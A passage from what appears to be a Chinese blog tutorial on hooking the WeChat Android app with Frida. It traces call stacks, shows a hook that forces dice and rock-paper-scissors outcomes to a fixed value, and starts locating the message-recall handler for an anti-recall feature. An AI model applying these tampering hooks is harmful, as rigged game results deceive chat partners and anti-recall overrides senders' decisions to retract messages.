class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a1,a2</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook ii start&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a1:&quot;</span>+a1);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a2:&quot;</span>+a2);</span><br><span class="line">        <span class="keyword">var</span> rtn= <span class="variable language_">this</span>.<span class="title function_">jE</span>(<span class="number">5</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;rtn:&quot;</span>+rtn);</span><br><span class="line">        <span class="comment">//打印调用栈</span></span><br><span class="line">        <span class="keyword">var</span> threadef = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Thread&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> threadinstance = threadef.$new();</span><br><span class="line">        <span class="keyword">var</span> stack = threadinstance.<span class="title function_">currentThread</span>().<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Where</span>(<span class="params">stack</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stack.<span class="property">length</span>; ++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(stack[i].<span class="title function_">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Full call stack:&quot;</span> + <span class="title class_">Where</span>(stack));</span><br><span class="line">        <span class="keyword">return</span> rtn</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过多次测试知道，如果是骰子，i=5,i2=0，如果是石头剪刀布i=2,i2=0，所以当骰子时getCount()==6，石头剪刀布getCount()==3。并且<strong>骰子结果是jE返回值+1</strong>，<strong>剪刀石头布分别对应着0 1 2</strong></p><h3 id="hook修改骰子-石头剪刀布"><a href="#hook修改骰子-石头剪刀布" class="headerlink" title="hook修改骰子/石头剪刀布"></a>hook修改骰子/石头剪刀布</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">saizi</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.sdk.platformtools.bu&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">jE</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="variable language_">arguments</span>.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;bu.jE arguments&quot;</span>+i,<span class="variable language_">arguments</span>[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> result = clazz.<span class="property">jE</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;石头剪刀布结果为:&quot;</span>,result==<span class="number">0</span>?<span class="string">&quot;剪刀&quot;</span>:result==<span class="number">1</span>?<span class="string">&quot;石头&quot;</span>:<span class="string">&quot;布&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;骰子点数为:&quot;</span>,result+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 进行修改</span></span><br><span class="line">            result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Integer&quot;</span>).<span class="built_in">parseInt</span>(<span class="string">&quot;5&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="vx防撤回"><a href="#vx防撤回" class="headerlink" title="vx防撤回"></a>vx防撤回</h2><h3 id="定位-2"><a href="#定位-2" class="headerlink" title="定位"></a>定位</h3><p>这里可以搜索关键字来进行定位，搜索关键字符串”revoke”，定位到类<code>com.tencent.mm.plugin.msgquote.PluginMsgQuote.handleRevokeMsgBySvrId</code></p><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>来到方法<code>handleRevokeMsgBySvrId</code>看名字发现这样是个处理撤回消息的方法，那看看哪里调用了这个方法。</p><p>可以打印这个方法的调用栈</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showstacks_handleRevokeMsgBySvrId</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.msgquote.PluginMsgQuote&#x27;</span>);</span><br><span class="line">    clazz.<span class="property">handleRevokeMsgBySvrId</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> threadef = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Thread&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> threadinstance = threadef.$new();</span><br><span class="line">        <span class="keyword">var</span> stack = threadinstance.<span class="title function_">currentThread</span>().<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Where</span>(<span class="params">stack</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stack.<span class="property">length</span>; ++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(stack[i].<span class="title function_">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Full call stack:&quot;</span> + <span class="title class_">Where</span>(stack));    </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.msgquote</span><span class="selector-class">.PluginMsgQuote</span><span class="selector-class">.handleRevokeMsgBySvrId</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">2190</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.ch</span><span class="selector-class">.b</span>(SourceFile:<span class="number">258</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.s</span><span class="selector-class">.b</span><span class="selector-class">.b</span>(SourceFile:<span class="number">40</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.processAddMsg</span>(SourceFile:<span class="number">165</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">1059</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">118</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.zero</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">57</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.modelmulti</span>.q<span class="variable">$a</span>$<span class="number">1</span><span class="selector-class">.onTimerExpired</span>(SourceFile:<span class="number">830</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span><span class="selector-class">.aw</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">86</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">362</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Handler</span><span class="selector-class">.dispatchMessage</span>(Handler<span class="selector-class">.java</span>:<span class="number">106</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.dispatchMessage</span>(SourceFile:<span class="number">350</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Looper</span><span class="selector-class">.loop</span>(Looper<span class="selector-class">.java</span>:<span class="number">193</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.HandlerThread</span><span class="selector-class">.run</span>(HandlerThread<span class="selector-class">.java</span>:<span class="number">65</span>)</span><br></pre></td></tr></table></figure><p>然后写出如下脚本(猜测应该是发送消息和撤回消息经过的调用栈会有所区别，这里区分哪里是处理撤回消息的方法)</p><p>下面 代码功能就是打印上面可能调用的方法的参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">revoke</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.msgquote.PluginMsgQuote&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">handleRevokeMsgBySvrId</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;8 handleRevokeMsgBySvrId&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">handleRevokeMsgBySvrId</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.f&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;7 f.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.ch&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;6 ch.b()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.s.b&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5 b.b()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.c&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">processAddMsg</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;4 c.processAddMsg()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">processAddMsg</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.c&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;3 c.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.f&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;2 f.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.zero.c&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1 c.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现对方撤回消息打印如下信息：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@<span class="number">83</span>a5410 [<span class="number">1</span>]false</span><br><span class="line"><span class="symbol">2 </span>f.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@<span class="number">83</span>a5410 [<span class="number">1</span>][object Object] [<span class="number">2</span>]false</span><br><span class="line"><span class="symbol">3 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@<span class="number">83</span>a5410 [<span class="number">1</span>][object Object] [<span class="number">2</span>]false [<span class="number">3</span>][object Object]</span><br><span class="line"><span class="symbol">4 </span>c.processAddMsg() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>] [<span class="number">1</span>][object Object]</span><br><span class="line"><span class="symbol">5 </span>b.b() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>]</span><br><span class="line"><span class="symbol">6 </span>ch.b() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>]</span><br><span class="line"><span class="symbol">7 </span>f.a() arguments: [<span class="number">0</span>]revokemsg [<span class="number">1</span>][object Object] [<span class="number">2</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>]</span><br><span class="line"><span class="symbol">8 </span>handleRevokeMsgBySvrId arguments: [<span class="number">0</span>]<span class="number">3286380964546034700</span></span><br></pre></td></tr></table></figure><p>对方发送消息打印如下信息：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@df09a3a [<span class="number">1</span>]false</span><br><span class="line"><span class="symbol">2 </span>f.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@df09a3a [<span class="number">1</span>][object Object] [<span class="number">2</span>]false</span><br><span class="line"><span class="symbol">3 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@df09a3a [<span class="number">1</span>][object Object] [<span class="number">2</span>]false [<span class="number">3</span>][object Object]        </span><br><span class="line"><span class="symbol">4 </span>c.processAddMsg() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">21726955</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>] [<span class="number">1</span>][object Object]</span><br></pre></td></tr></table></figure><p>发现确实有所区别，从processAddMsg()方法开始就不一样了，所以processAddMsg()方法算是一个关键，如果判断是撤回消息继续向下面执行，如果不是撤回消息就停在processAddMsg()方法了，跟进这个方法看看内容。</p><p><code>com.tencent.mm.plugin.messenger.foundation.c.processAddMsg</code>，按照上面打印的调用栈，下面可能会执行到<code>com.tencent.mm.s.b.b</code>方法，所以在processAddMsg()方法中找到如下位置：</p><p><img src="assets/image-20240611155113284.png" alt="image-20240611155113284"></p><p>发现是否进入下一个方法com.tencent.mm.s.b.b关键是bk值，而bk值好像是受到</p><p><strong>com.tencent.mm.ak.e bK = e.d.bK(Integer.valueOf(cvVar.vkP))</strong>影响，这里可以关注一下cvVar.vkP值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">revoke_vkp</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.cv&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> vkP = obj.<span class="property">vkP</span>.<span class="property">value</span>;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title 